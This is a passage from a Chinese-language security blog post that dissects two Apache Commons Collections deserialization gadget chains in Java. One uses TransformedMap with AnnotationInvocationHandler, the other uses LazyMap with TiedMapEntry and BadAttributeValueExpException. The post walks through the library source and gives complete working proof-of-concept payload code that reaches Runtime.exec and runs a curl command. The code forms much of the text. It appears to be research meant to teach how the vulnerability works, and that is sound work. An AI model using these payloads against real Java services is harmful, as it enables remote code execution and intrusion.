            return this.valueTransformer == null ? object : this.valueTransformer.transform(object);
        }
这里的话只要`valueTransformer`可控即可利用我们上面的调用链,
    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
            super(map);
            this.keyTransformer = keyTransformer;
            this.valueTransformer = valueTransformer;
        }
当我们初始化的时候是可以控制的,怎么触发呢,继续看
    public Object put(Object key, Object value) {
            key = this.transformKey(key);
            value = this.transformValue(value);
            return this.getMap().put(key, value);
        }
当进入put方法的时候会触发,根据上面的调用链我们之后`value`是可以任意值的,修改代码
    public static void main(String[] args)
        {
            Transformer[] transformers = {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{ String.class, Class[].class}, new Object[]{"getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[]{ Object.class, Object[].class}, new Object[]{ null ,new Object[0]} ),
                    new InvokerTransformer("exec",
                            new Class[] {String.class },
                            new Object[] {"curl http://127.0.0.1:10000"})
            };
            Transformer transformerChain = new ChainedTransformer(transformers);
            Map map = new HashMap();
            Map transformedmap = TransformedMap.decorate(map, null, transformerChain);
            transformedmap.put("1", "2");
这样我们即可进行命令执行。
然后我们要想实现反序列化RCE还需要找个重写readObject的地方,而且还需要有对Map的操作。
但是我并没有找到有对map执行put的操作
这里还有一处可以实现一样的效果,这里的实现原理跟put那是一样的
    protected Object checkSetValue(Object value) {
            return this.valueTransformer.transform(value);
        }
什么时候会调用到`checkSetValue`方法呢
在它所继承的父类`AbstractInputCheckedMapDecorator`中
    static class MapEntry extends AbstractMapEntryDecorator {
            private final AbstractInputCheckedMapDecorator parent;
            protected MapEntry(Entry entry, AbstractInputCheckedMapDecorator parent) {
                super(entry);
                this.parent = parent;
            }
            public Object setValue(Object value) {
                value = this.parent.checkSetValue(value);
                return super.entry.setValue(value);
            }
        }
有个`MapEntry`的内部类,这里面实现了`setValue`,并且会触发`checkSetValue`，然后我们需要找一个readObject中有对map执行setValue的操作。
在jdk小于1.7的时候`/reflect/annotation/AnnotationInvocationHandler.class`中,readObject中有对map的修改功能,这里我下载了jdk1.7来看下
    private void readObject(java.io.ObjectInputStream s)
            throws java.io.IOException, ClassNotFoundException {
            s.defaultReadObject();
            // Check to make sure that types have not evolved incompatibly
            AnnotationType annotationType = null;
            try {
                annotationType = AnnotationType.getInstance(type);
            } catch(IllegalArgumentException e) {
                // Class is no longer an annotation type; all bets are off
                return;
            }
            Map> memberTypes = annotationType.memberTypes();
            for (Map.Entry memberValue : memberValues.entrySet()) {
                String name = memberValue.getKey();
                Class memberType = memberTypes.get(name);
                if (memberType != null) {  // i.e. member still exists
                    Object value = memberValue.getValue();
                    if (!(memberType.isInstance(value) ||
                          value instanceof ExceptionProxy)) {
                        memberValue.setValue(
                            new AnnotationTypeMismatchExceptionProxy(
                                value.getClass() + "[" + value + "]").setMember(
                                    annotationType.members().get(name)));
                    }
                }
            }
我们先看下payload触发的调用堆栈
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.map.HashedMap;
    import org.apache.commons.collections.map.TransformedMap;
    import java.io.*;
    import java.util.HashMap;
    import java.lang.reflect.Constructor;
    import java.util.Map;
    import java.lang.reflect.InvocationTargetException;
    import java.lang.reflect.Method;
    public class test implements Serializable{
        public static void main(String[] args) throws Exception
        {
            Transformer[] transformers = {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{ String.class, Class[].class}, new Object[]{"getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[]{ Object.class, Object[].class}, new Object[]{ null ,new Object[0]} ),
                    new InvokerTransformer("exec",
                            new Class[] {String.class },
                            new Object[] {"curl http://127.0.0.1:10000"})
            };
            Transformer transformerChain = new ChainedTransformer(transformers);
            Map map = new HashMap();
            map.put("value", "2");
            Map transformedmap = TransformedMap.decorate(map, null, transformerChain);
            Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);
            cons.setAccessible(true);
            Object ins = cons.newInstance(java.lang.annotation.Retention.class,transformedmap);
            ByteArrayOutputStream exp = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(exp);
            oos.writeObject(ins);
            oos.flush();
            oos.close();
            ByteArrayInputStream out = new ByteArrayInputStream(exp.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(out);
            Object obj = (Object) ois.readObject();
        }
    }
可以看到通过构造payload将构造的map成功传到var2,继续跟到readObject来看一下
这里如果不动态调一下的话不太好理解
首先是获取了`java.lang.annotation.Retention`的实例,然后跟进到`memberTypes`方法
会返回一个map,继续往下走到`Iterator var4 = this.memberValues.entrySet().iterator();`
因为这里`this.memberValues=TransformedMap`对象,然后调用其父类的`entrySet`方法
然后内部类会返回一个迭代器
通过这里我们可以知道为什么key一定要为`value`,我们需要让`var7`这个变量获取到`java.lang.annotation.RetentionPolicy`
然后是判断两个是否是实例的判断,然后进入到
然后这里就调用到了
    static class MapEntry extends AbstractMapEntryDecorator {
            private final AbstractInputCheckedMapDecorator parent;
            protected MapEntry(Entry entry, AbstractInputCheckedMapDecorator parent) {
                super(entry);
                this.parent = parent;
            }
            public Object setValue(Object value) {
                value = this.parent.checkSetValue(value);
                return super.entry.setValue(value);
            }
        }
进入`checkSetValue`，也就是可以触发的地方,来看
##### 攻击链(二)
攻击链一种的触发操作在jdk1.8是不存在的,那么我们来分析下jdk1.8中的攻击链,
我们还可以找到另外一处调`transform`可控的地方,
    public Object get(Object key) {
            if (!super.map.containsKey(key)) {
                Object value = this.factory.transform(key);
                super.map.put(key, value);
                return value;
            } else {
                return super.map.get(key);
            }
        }
首先,map中如果不包含这个key那么就可以进入`transform`,并且可以看到factory也是我们可控的
    protected LazyMap(Map map, Transformer factory) {
            super(map);
            if (factory == null) {
                throw new IllegalArgumentException("Factory must not be null");
            } else {
                this.factory = factory;
            }
        }
也就是说只要让`factory`为`transformerChain`对象即可触发,key的值没啥影响
那么什么时候会调用get方法呢,可以找到`/org/apache/commons/collections/keyvalue/TiedMapEntry.class`
    public Object getValue() {
            return this.map.get(this.key);
        }
    public String toString() {
            return this.getKey() + "=" + this.getValue();
        }
在toString方法中会调用,那么java中的toString什么时候调用呢
这里的toString方法的作用其实跟php的是差不多的
现在我们我还差一步,就是哪里可以触发这个`toString`进而触发getValue呢
来看`/javax/management/BadAttributeValueExpException.java`中的readObject方法
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
            ObjectInputStream.GetField gf = ois.readFields();
            Object valObj = gf.get("val", null);
            if (valObj == null) {
                val = null;
            } else if (valObj instanceof String) {
                val= valObj;
            } else if (System.getSecurityManager() == null
                    || valObj instanceof Long
                    || valObj instanceof Integer
                    || valObj instanceof Float
                    || valObj instanceof Double
                    || valObj instanceof Byte
                    || valObj instanceof Short
                    || valObj instanceof Boolean) {
                val = valObj.toString();
            } else { // the serialized object is from a version without JDK-8019292 fix
                val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
            }
        }
这里我们并不会触发`setSecurityManager0`的操作,也就是说在`System.getSecurityManager()`会返回null,那么就会触发toString,然后我们只要让val个变量的值为`TiedMapEntry`对象即可触发，因为这里是个私有变量,所以我们通过反射所有变量来赋值,那么整个攻击链就构造完成了。
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.map.HashedMap;
    import org.apache.commons.collections.map.TransformedMap;
    import java.io.*;
    import java.util.HashMap;
    import org.apache.commons.collections.map.LazyMap;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import javax.management.BadAttributeValueExpException;
    import java.lang.reflect.Field;
    import java.lang.reflect.Constructor;
    import java.util.Map;
    import java.lang.reflect.InvocationTargetException;
    import java.lang.reflect.Method;
    public class test implements Serializable{
        public static void main(String[] args) throws Exception
        {
            Transformer[] transformers = {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{ String.class, Class[].class}, new Object[]{"getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[]{ Object.class, Object[].class}, new Object[]{ null ,new Object[0]} ),
                    new InvokerTransformer("exec",
                            new Class[] {String.class },
                            new Object[] {"curl http://127.0.0.1:10000"})
            };
            Transformer transformerChain = new ChainedTransformer(transformers);
            Map innerMap = new HashMap();
            Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
            TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
            BadAttributeValueExpException ins = new BadAttributeValueExpException(null);
            Field valfield = ins.getClass().getDeclaredField("val");
            valfield.setAccessible(true);
            valfield.set(ins, entry);
            ByteArrayOutputStream exp = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(exp);
            oos.writeObject(ins);
            oos.flush();
            oos.close();
            ByteArrayInputStream out = new ByteArrayInputStream(exp.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(out);
            Object obj = (Object) ois.readObject();
            ois.close();
        }
    }
参考:
    https://www.anquanke.com/post/id/82934
    https://p0sec.net/index.php/archives/121/
    https://security.tencent.com/index.php/blog/msg/97